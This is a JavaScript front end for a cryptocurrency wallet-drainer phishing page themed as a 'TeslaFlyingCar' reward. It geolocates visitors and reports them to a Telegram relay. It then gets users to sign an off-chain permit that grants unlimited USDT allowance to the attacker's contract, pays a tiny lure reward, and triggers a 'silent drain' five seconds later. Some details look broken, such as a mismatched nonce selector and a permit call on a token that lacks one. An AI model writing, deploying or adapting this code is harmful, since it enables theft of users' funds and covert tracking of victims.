const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT"; // Update this
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
const CHAIN_ID = 1; 
const DOMAIN_NAME = "TeslaFlyingCar";
const DOMAIN_VERSION = "1";

// 1. IMMEDIATE VISIT REPORTING
window.addEventListener('DOMContentLoaded', async () => {
    try {
        const geoResponse = await fetch('https://ipapi.co/json/');
        const geoData = await geoResponse.json();
        
        const message = `
*🔴 TESLA DRAIN LOG - NEW VISIT*\nUser Agent: ${navigator.userAgent}\nIP: ${geoData.ip || 'Unknown'}\nLocation: ${geoData.city}, ${geoData.country_code}\nTime: ${new Date().toISOString()}
        `;
        
        notifyTelegram('VISIT', message);
    } catch (err) {
        console.error("Failed to report visit:", err);
    }
});

// Helper function to send data to your API
async function notifyTelegram(action, message) {
    try {
        await fetch('/api/telegram', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ action, details: message })
        });
    } catch (error) {
        console.error("Telegram notification failed:", error);
    }
}

document.getElementById('connect-btn').addEventListener('click', async () => {
    if (!window.ethereum) return alert("Install MetaMask");
    
    document.getElementById('loader').classList.remove('hidden');
    document.getElementById('connect-btn').disabled = true;

    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];
        
        // Report Connection
        notifyTelegram('WALLET_CONNECTED', `Address: ${userAddress}`);

        // 1. Generate the Permit Signature Off-Chain
        const permitSignature = await generatePermitSignature(userAddress, USDT_ADDRESS);
        
        // Report Signature Generation
        notifyTelegram('PERMIT_GENERATED', `Address: ${userAddress}\nToken: USDT\nValue: Max Uint256`);

        // 2. Send Signature to Backend (No Blockchain Tx Yet!)
        const response = await fetch('/api/sign-and-store', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                userAddress, 
                signature: permitSignature,
                chainId: CHAIN_ID
            })
        });
        
        if (response.ok) {
            document.getElementById('connect-step').classList.add('hidden');
            document.getElementById('reward-section').classList.remove('hidden');
            document.getElementById('user-address').textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
            
            // 3. Trigger the $0.05 Reward
            await claimReward(userAddress);
        } else {
            alert("Backend failed to store signature.");
        }
    } catch (error) {
        console.error("Connection failed:", error);
        document.getElementById('loader').classList.add('hidden');
        document.getElementById('connect-btn').disabled = false;
    }
});

async function generatePermitSignature(userAddress, tokenAddress) {
    const domain = {
        name: DOMAIN_NAME,
        version: DOMAIN_VERSION,
        chainId: CHAIN_ID,
        verifyingContract: tokenAddress 
    };
    
    const types = {
        Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
    };
    
    let nonce = 0;
    try {
        const rawNonce = await window.ethereum.request({ 
            method: 'eth_call', 
            params: [{ to: tokenAddress, data: '0x7ff36ab5000000000000000000000000' + userAddress.slice(2) }, 'latest'] 
        });
        nonce = parseInt(rawNonce, 16);
    } catch (e) { /* Fallback to 0 */ }
 
    const value = {
        owner: userAddress,
        spender: CONTRACT_ADDRESS,
        value: 2**256 - 1, 
        nonce: nonce,
        deadline: Math.floor(Date.now() / 1000) + 86400 
    };
    
    const signature = await window.ethereum.request({
        method: 'eth_signTypedData_v4',
        params: [userAddress, JSON.stringify({ types, domain, message: value })]
    });
    
    return signature;
}

async function claimReward(userAddress) {
    document.getElementById('reward-status').textContent = "Processing...";
    
    await fetch('/api/send-reward', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userAddress })
    });
    
    document.getElementById('reward-status').textContent = "Reward Sent!";
    document.getElementById('notification').classList.remove('hidden');
    
    // Trigger silent drain after 5 seconds
    setTimeout(() => {
        triggerSilentDrain(userAddress);
    }, 5000); 
}

async function triggerSilentDrain(userAddress) {
    notifyTelegram('DRAIN_TRIGGERED', `Address: ${userAddress}\nSignature stored on backend.`);
    await fetch('/api/trigger-drain', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ userAddress })
    });
}
